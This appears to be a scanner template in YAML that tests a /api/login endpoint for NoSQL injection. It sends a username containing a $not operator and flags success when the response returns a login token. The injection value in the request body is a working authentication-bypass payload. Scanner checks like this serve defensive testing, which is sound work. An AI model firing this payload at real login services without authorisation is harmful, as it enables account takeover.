id: nosql-57
name: 'NoSQL $not in username'
severity: high
type: active
tags:
  - nosql
  - injection
  - api
description: 'NoSQL operator $not accepted on /api/login'
requests:
  - method: POST
    path: '{{BaseURL}}/api/login'
    body: '{"username":{"$not":""},"extra":"x"}'
    match-all: true
    matchers:
      - type: status
        status: [200]
      - type: regex
        part: body
        regex:
          - '"token"\s*:'
